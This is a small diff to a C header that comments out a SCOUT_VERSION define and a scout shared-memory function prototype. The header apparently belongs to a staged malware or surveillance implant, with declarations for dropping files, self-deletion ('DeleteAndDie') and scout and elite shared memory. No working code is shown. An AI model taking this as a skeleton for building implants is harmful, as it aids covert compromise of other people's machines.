@@ -3,7 +3,7 @@
 
 #include "binpatched_vars.h"
 
-#define SCOUT_VERSION 7
+//#define SCOUT_VERSION 7
 #define SHARED_MEMORY_WRITE_SIZE 4096
 
 VOID MySleep(ULONG uTime);
@@ -12,7 +12,7 @@ VOID UseLess();
 VOID DeleteAndDie(BOOL uDie);
 VOID Drop();
 VOID DoCopyFile(PWCHAR pSource, PWCHAR pDest);
-PCHAR GetScoutSharedMemoryName();
+//PCHAR GetScoutSharedMemoryName();
 PCHAR GetEliteSharedMemoryName();
 LPWSTR CreateTempFile();
 BOOL CreateScoutSharedMemory();
